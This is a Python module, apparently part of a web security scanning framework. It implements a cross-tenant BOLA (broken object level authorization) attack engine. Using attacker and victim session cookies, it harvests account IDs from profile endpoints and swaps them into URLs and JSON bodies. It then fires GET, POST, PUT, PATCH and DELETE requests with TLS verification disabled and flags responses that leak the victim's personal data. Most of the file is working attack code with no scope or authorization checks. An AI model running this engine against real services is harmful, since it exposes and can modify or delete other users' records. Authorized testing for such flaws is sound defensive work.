import asyncio
import json
import re
import os
import copy
from typing import Any, Dict, List, Optional
import httpx
from datetime import datetime

from aura.core.engine_base import AbstractEngine
from aura.ui.formatter import console

class BolaButcherEngine(AbstractEngine):
    """
    The BOLA Logic Butcher (Phase 2):
    Asynchronous, dual-state cross-tenant massive payload swapper.
    Extracts attacker and victim IDs dynamically and violently mutates HTTP targets.
    """
    ENGINE_ID = "bola_butcher"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.attacker_cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
        self.victim_cookies_str = os.getenv("AUTH_TOKEN_VICTIM", "")
        
        self.attacker_cookies = self._parse_cookie_string(self.attacker_cookies_str)
        self.victim_cookies = self._parse_cookie_string(self.victim_cookies_str)
        
        # Dual-State Context
        self.dual_context = {
            "attacker": {"ids": [], "emails": []},
            "victim": {"ids": [], "emails": []}
        }
        self.results = []
        
        # Async HTTP client logic
        self.timeout = 15.0
        self.min_meaningful_len = 50

    def _parse_cookie_string(self, cookie_str: str) -> dict:
        cookies = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                name, _, value = part.partition("=")
                cookies[name.strip()] = value.strip()
        return cookies

    async def _extract_identities(self, target: str):
        """Asynchronously crawl standard profile/me endpoints to harvest IDs."""
        profile_paths = ["/api/v1/me", "/api/me", "/api/v1/profile", "/api/user", "/my-account", "/profile"]
        
        async def fetch_identity(client: httpx.AsyncClient, base_url: str, cookies: dict, role: str):
            for path in profile_paths:
                url = f"{base_url.rstrip('/')}{path}"
                try:
                    resp = await client.get(url, cookies=cookies, follow_redirects=False)
                    if resp.status_code == 200 and resp.text:
                        try:
                            data = resp.json()
                            for key in ["id", "user_id", "userId", "uid", "customerId", "uuid", "account_id"]:
                                val = data.get(key)
                                if val and str(val) not in self.dual_context[role]["ids"]:
                                    self.dual_context[role]["ids"].append(str(val))
                                    self.emit_progress(step=f"Extracted {role.upper()} ID: {val}")
                            for key in ["email", "emailAddress", "username"]:
                                val = data.get(key)
                                if val and str(val) not in self.dual_context[role]["emails"]:
                                    self.dual_context[role]["emails"].append(str(val))
                        except json.JSONDecodeError:
                            pass
                except BaseException:
                    pass

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            tasks = []
            if self.attacker_cookies:
                tasks.append(fetch_identity(client, target, self.attacker_cookies, "attacker"))
            if self.victim_cookies:
                tasks.append(fetch_identity(client, target, self.victim_cookies, "victim"))
            
            if tasks:
                await asyncio.gather(*tasks)

    def _generate_bola_payloads(self, original_data: Any) -> Any:
        """Swap known attacker identifiers with victim identifiers in nested payloads."""
        if not original_data or not self.dual_context["attacker"]["ids"] or not self.dual_context["victim"]["ids"]:
            return original_data
            
        a_id = str(self.dual_context["attacker"]["ids"][0])
        v_id = str(self.dual_context["victim"]["ids"][0])
        
        if isinstance(original_data, dict):
            new_data = copy.deepcopy(original_data)
            json_str = json.dumps(new_data)
            json_str = json_str.replace(f'"{a_id}"', f'"{v_id}"').replace(f': {a_id}', f': {v_id}')
            return json.loads(json_str)
        elif isinstance(original_data, str):
            return original_data.replace(a_id, v_id)
        return original_data

    async def _test_endpoint(self, client: httpx.AsyncClient, url: str, method: str, post_data: Any = None):
        """Asynchronous cross-tenant payload swap and validation logic."""
        headers = {"User-Agent": "Aura-Bola-Butcher/1.0", "Accept": "application/json"}
        
        try:
            # 1. Baseline Request (Attacker touches own data)
            req_kwargs = {"headers": headers, "cookies": self.attacker_cookies}
            if post_data and method.upper() in ["POST", "PUT", "PATCH", "DELETE"]:
                req_kwargs["json"] = post_data
                
            baseline_resp = await client.request(method, url, **req_kwargs)
            
            # If standard request fails, bail out.
            if baseline_resp.status_code not in [200, 201, 204]:
                return
                
            # 2. Forge Payload targeting Victim
            malicious_url = url
            malicious_data = post_data

            if self.dual_context["attacker"]["ids"] and self.dual_context["victim"]["ids"]:
                a_id = str(self.dual_context["attacker"]["ids"][0])
                v_id = str(self.dual_context["victim"]["ids"][0])
                malicious_url = url.replace(a_id, v_id)
                malicious_data = self._generate_bola_payloads(post_data)
                
            if malicious_url == url and malicious_data == post_data:
                # No ID replaced, useless to test BOLA.
                return
                
            # 3. Attack Request (Attacker touches Victim data)
            atk_kwargs = {"headers": headers, "cookies": self.attacker_cookies}
            if malicious_data and method.upper() in ["POST", "PUT", "PATCH", "DELETE"]:
                atk_kwargs["json"] = malicious_data
                
            victim_resp = await client.request(method, malicious_url, **atk_kwargs)

            # 4. Impact Assessment
            v_status = victim_resp.status_code
            v_len = len(victim_resp.text)
            
            is_bola = False
            severity = "HIGH"
            reason = ""
            
            v_body = victim_resp.text.lower()
            
            if v_status in [200, 201, 204] and v_len >= self.min_meaningful_len:
                # Check semantic indicators
                pii_keywords = ["email", "name", "address", "phone", "order", "credit", "account"]
                pii_found = [kw for kw in pii_keywords if kw in v_body]
                
                if pii_found:
                    is_bola = True
                    reason = f"Accessed victim resource! Leaked info: {', '.join(pii_found)}"
                    severity = "CRITICAL" if method in ["POST", "PUT", "PATCH", "DELETE"] else "HIGH"
                elif v_len > 200:
                    is_bola = True
                    reason = f"Possible BOLA, accessed victim endpoint yielding {v_len} bytes."

            if is_bola:
                vuln = {
                    "type": "Broken Object Level Authorization (BOLA)",
                    "title": f"BOLA Logic Flaw on [{method}] {malicious_url}",
                    "severity": severity,
                    "description": reason,
                    "evidence": {
                        "attacker_baseline_status": baseline_resp.status_code,
                        "victim_target_status": v_status,
                        "victim_response_snippet": victim_resp.text[:250],
                        "payload_sent": malicious_data
                    }
                }
                self.results.append(vuln)
                self.emit_vulnerability(vuln)
                
        except Exception as e:
            pass

    async def run(self, **kwargs) -> Any:
        self.emit_progress(step="Booting The Logic Butcher (Async BOLA Engine)...")
        
        target = self.context.target if hasattr(self.context, 'target') else kwargs.get("target")
        if not target:
            return []
            
        if not target.startswith("http"):
            target = "https://" + target
            
        if not self.attacker_cookies:
            console.print("[dim yellow]BOLA Butcher skipped: Missing AUTH_TOKEN_ATTACKER in environment.[/dim yellow]")
            return []
            
        if not self.victim_cookies:
            console.print("[dim yellow]BOLA Butcher running in single-tenant degraded mode (Missing AUTH_TOKEN_VICTIM)[/dim yellow]")
            
        await self._extract_identities(target)
        
        if self.dual_context["attacker"]["ids"] and self.dual_context["victim"]["ids"]:
            console.print(f"[bold red]🩸 Logic Butcher armed: Mapping {self.dual_context['attacker']['ids'][0]} -> {self.dual_context['victim']['ids'][0]}[/bold red]")
        
        # Aggregate endpoints from intelligence
        endpoints_to_test = []
        intel = self.context.get_intel() if hasattr(self.context, "get_intel") else {}
        urls = intel.get("urls", set())
        
        # Format: [{"url": "...", "method": "GET", "post_data": None}]
        for u in urls:
            endpoints_to_test.append({"url": u, "method": "GET", "post_data": None})
            
        # Optional: You could deeply integrate Swagger/GraphQL models here.
        if not endpoints_to_test:
            # Blind probe fallback
            endpoints_to_test = [
                {"url": f"{target}/api/v1/user/{self.dual_context['attacker']['ids'][0] if self.dual_context['attacker']['ids'] else '1'}", "method": "GET"},
                {"url": f"{target}/api/profile", "method": "GET"},
                {"url": f"{target}/users/me", "method": "GET"}
            ]

        self.emit_progress(step=f"Butchering {len(endpoints_to_test)} endpoints dynamically...")

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            tasks = []
            for ep in endpoints_to_test:
                tasks.append(self._test_endpoint(client, ep["url"], ep["method"], ep.get("post_data")))
                
                # Batch control to prevent completely blowing up descriptors
                if len(tasks) >= 50:
                    await asyncio.gather(*tasks)
                    tasks = []
                    
            if tasks:
                await asyncio.gather(*tasks)
                
        return self.results

